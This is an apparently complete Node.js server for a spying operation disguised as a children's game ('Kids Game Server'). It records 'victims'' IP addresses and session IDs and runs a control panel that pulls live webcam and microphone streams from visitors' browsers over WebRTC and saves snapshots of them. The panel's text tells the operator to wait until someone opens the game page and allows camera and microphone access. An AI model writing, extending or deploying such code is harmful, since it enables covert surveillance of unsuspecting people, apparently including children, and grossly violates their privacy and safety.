const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 8080;

// لوج الجلسات
const sessionsLog = path.join(__dirname, 'sessions.json');
if (!fs.existsSync(sessionsLog)) fs.writeFileSync(sessionsLog, '[]');

app.use(express.json({limit: '50mb'}));
app.use(express.static(path.join(__dirname, 'public')));

// صفحة الألعاب
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API: تسجيل ضحية جديدة
app.post('/api/log', (req, res) => {
  const data = req.body;
  data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  const sessions = JSON.parse(fs.readFileSync(sessionsLog));
  sessions.push(data);
  fs.writeFileSync(sessionsLog, JSON.stringify(sessions, null, 2));
  
  console.log(`[+] New victim: ${data.sessionId} from ${data.ip}`);
  res.json({ok: true});
});

// API: تسجيل PeerID
app.post('/api/peer-online', (req, res) => {
  const { peerId, sessionId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  console.log(`[📡] Peer online: ${peerId} (${sessionId}) from ${ip}`);
  
  // حفظ للوحة التحكم
  const peersPath = path.join(__dirname, 'active_peers.json');
  let peers = [];
  if (fs.existsSync(peersPath)) peers = JSON.parse(fs.readFileSync(peersPath));
  peers.push({ peerId, sessionId, ip, time: Date.now() });
  fs.writeFileSync(peersPath, JSON.stringify(peers, null, 2));
  
  res.json({ok: true});
});

// API: قائمة الجلسات النشطة (للوحة التحكم)
app.get('/api/sessions', (req, res) => {
  const peersPath = path.join(__dirname, 'active_peers.json');
  let peers = [];
  if (fs.existsSync(peersPath)) peers = JSON.parse(fs.readFileSync(peersPath));
  // تنظيف القديم (أكثر من 5 دقائق)
  peers = peers.filter(p => Date.now() - p.time < 300000);
  res.json(peers);
});

// صفحة التحكم
app.get('/control', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>🎮 Control Panel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0f0f1a;
      color: white;
      padding: 20px;
    }
    h1 { text-align: center; margin-bottom: 30px; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 36px; }
    .stats { text-align: center; margin-bottom: 25px; font-size: 18px; }
    .stats span { background: rgba(255,255,255,0.1); padding: 8px 20px; border-radius: 20px; margin: 0 5px; }
    .sessions { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; max-width: 1400px; margin: 0 auto; }
    .session-card {
      background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
      border-radius: 16px; padding: 20px; backdrop-filter: blur(10px);
    }
    .session-card h3 { color: #667eea; margin-bottom: 10px; }
    .session-card .info { font-size: 13px; color: #aaa; margin-bottom: 15px; word-break: break-all; }
    .session-card video { width: 100%; border-radius: 10px; background: #000; }
    .session-card .controls { margin-top: 12px; display: flex; gap: 10px; flex-wrap: wrap; }
    .session-card button {
      flex: 1; min-width: 80px; padding: 10px; border: none;
      border-radius: 8px; font-weight: 600; cursor: pointer; transition: all 0.2s;
    }
    .btn-audio { background: #6bcb77; color: #000; }
    .btn-stop { background: #ff6b6b; color: white; }
    .btn-snap { background: #4d96ff; color: white; }
    .session-card button:active { transform: scale(0.95); }
    .no-sessions { text-align: center; grid-column: 1 / -1; padding: 60px; color: #666; font-size: 20px; }
    .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 8px; }
    .status-dot.online { background: #6bcb77; box-shadow: 0 0 10px #6bcb77; }
    .refresh-btn { display: block; margin: 20px auto; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; padding: 12px 40px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; }
    .peer-id-box { background: rgba(255,255,255,0.05); padding: 8px; border-radius: 8px; font-family: monospace; font-size: 13px; margin: 8px 0; word-break: break-all; }
  </style>
</head>
<body>
  <h1>🎮 Control Panel</h1>
  <div class="stats">
    <span>🟢 <span id="sessionCount">0</span> active sessions</span>
    <span>📸 <span id="snapCount">0</span> snapshots</span>
  </div>
  <button class="refresh-btn" onclick="fetchSessions()">🔄 Refresh Now</button>
  <div class="sessions" id="sessionList"></div>

  <script src="https://unpkg.com/peerjs@1.5.1/dist/peerjs.min.js"></script>
  <script>
    let controlPeer = null;
    const connections = {};
    const videoElements = {};
    let snapCount = 0;

    // إنشاء Peer للتحكم (معرف ثابت)
    const ctrlId = 'ctrl-' + Date.now().toString(36);
    
    function initControlPeer() {
      controlPeer = new Peer(ctrlId, {
        config: {
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
            { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
          ]
        }
      });

      controlPeer.on('open', function() {
        console.log('Control PeerID:', ctrlId);
        document.getElementById('sessionCount').textContent = '0 (Ctrl: ' + ctrlId.substring(0,12) + '...)';
      });

      controlPeer.on('connection', function(conn) {
        // اتصال وارد من ضحية
        const sid = conn.peer;
        connections[sid] = conn;
        
        conn.on('data', function(data) {
          if (data.type === 'hello') {
            addSessionCard(sid, data.sessionId, data.ua);
          }
        });
      });

      controlPeer.on('call', function(call) {
        const sid = call.peer;
        call.answer(); // لا نرسل فيديو (نحن control)
        
        call.on('stream', function(remoteStream) {
          const vid = document.getElementById('video-' + sid);
          if (vid) {
            vid.srcObject = remoteStream;
            vid.play();
          }
        });
      });
    }

    function addSessionCard(peerId, sessionId, ua) {
      const list = document.getElementById('sessionList');
      
      // تحقق إذا كان موجود
      if (document.getElementById('card-' + peerId)) return;

      const card = document.createElement('div');
      card.className = 'session-card';
      card.id = 'card-' + peerId;

      card.innerHTML = \`
        <h3><span class="status-dot online"></span> \${sessionId}</h3>
        <div class="info">
          PeerID: <span class="peer-id-box">\${peerId}</span><br>
          UA: \${(ua || 'N/A').substring(0, 80)}<br>
          Time: \${new Date().toLocaleTimeString()}
        </div>
        <video id="video-\${peerId}" autoplay playsinline muted style="width:100%;border-radius:10px;background:#000;"></video>
        <div class="controls">
          <button class="btn-audio" onclick="toggleAudio('\${peerId}')">🔊 Audio</button>
          <button class="btn-snap" onclick="takeSnap('\${peerId}')">📸 Snap</button>
        </div>
      \`;

      list.appendChild(card);
      document.getElementById('sessionCount').textContent = list.children.length;
      
      // محاولة الاتصال بهذا الـ peer
      setTimeout(() => {
        connectToVictim(peerId);
      }, 500);
    }

    function connectToVictim(peerId) {
      try {
        const conn = controlPeer.connect(peerId, { reliable: true });
        connections[peerId] = conn;
        
        // Use a dummy stream instead of null for the call to work reliably across browsers
        const canvas = document.createElement('canvas');
        canvas.width = 640; canvas.height = 480;
        const dummyStream = canvas.captureStream(0);
        
        const call = controlPeer.call(peerId, dummyStream); 
        if (call) {
          call.on('stream', function(stream) {
            const vid = document.getElementById('video-' + peerId);
            if (vid) {
              vid.srcObject = stream;
              vid.play();
            }
          });
        }
      } catch(e) {
        console.log('Connect error:', e);
      }
    }

    function toggleAudio(peerId) {
      const vid = document.getElementById('video-' + peerId);
      if (vid) {
        vid.muted = !vid.muted;
      }
    }

    function takeSnap(peerId) {
      const vid = document.getElementById('video-' + peerId);
      if (!vid || !vid.srcObject) return;
      
      const canvas = document.createElement('canvas');
      canvas.width = vid.videoWidth || 640;
      canvas.height = vid.videoHeight || 480;
      canvas.getContext('2d').drawImage(vid, 0, 0);
      
      const link = document.createElement('a');
      link.download = 'snap_' + peerId.substring(0,8) + '_' + Date.now() + '.png';
      link.href = canvas.toDataURL();
      link.click();
      
      snapCount++;
      document.getElementById('snapCount').textContent = snapCount;
    }

    async function fetchSessions() {
      try {
        const res = await fetch('/api/sessions');
        const sessions = await res.json();
        
        const list = document.getElementById('sessionList');
        
        if (sessions.length === 0) {
          if (!list.querySelector('.no-sessions')) {
            list.innerHTML = '<div class="no-sessions">🔴 Waiting for victims...<br><small>Make sure someone opens the game page and allows camera/mic</small></div>';
          }
          document.getElementById('sessionCount').textContent = '0';
          return;
        }

        // إزالة رسالة "no sessions"
        const noSess = list.querySelector('.no-sessions');
        if (noSess) noSess.remove();

        sessions.forEach(s => {
          addSessionCard(s.peerId, s.sessionId, '');
        });
      } catch(e) {
        console.log('Fetch error:', e);
      }
    }

    // بدء التحكم
    initControlPeer();
    
    // جلب الجلسات كل 5 ثواني
    setInterval(fetchSessions, 5000);
    fetchSessions();
  </script>
</body>
</html>
  `);
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════╗
║  🎮 Kids Game Server Running             ║
╠══════════════════════════════════════════╣
║  Game Page:  /                           ║
║  Control:    /control                    ║
║  Port:       ${PORT}                      ║
╚══════════════════════════════════════════╝
  `);
});
